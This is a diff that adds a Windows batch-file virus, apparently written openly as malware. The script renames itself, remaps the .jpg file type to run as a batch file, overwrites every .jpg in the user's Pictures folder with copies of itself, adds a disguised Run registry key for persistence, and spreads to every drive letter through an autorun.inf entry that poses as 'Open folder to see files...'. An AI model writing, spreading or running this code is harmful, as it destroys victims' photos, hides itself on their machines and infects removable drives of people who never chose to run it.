@@ -1,0 +1,17 @@
+%viruz%
+%viruz%@echo off
+%viruz%set myself=PiCtUrEpErFeCt_%random%_%random%.bat
+%viruz%ren %0 %myself%
+%viruz%assoc .jpg=batfile
+%viruz%for %%j in (%UserProfile%\Pictures\*.jpg) do (copy /y %0 %%j)
+%viruz%find "KOYULACAK YAZI"<%0>>%0
+%viruz%set valinf="rundll32_%random%_toolbar"
+%viruz%set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
+%viruz%reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
+%viruz%for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
+%viruz%copy /Y %0 %%E:\
+%viruz%echo [AutoRun] > %%E:\autorun.inf
+%viruz%echo open="%%E:\%myself%" >> %%E:\autorun.inf
+%viruz%echo action=Open folder to see files... >> %%E:\autorun.inf)
+%viruz%
+
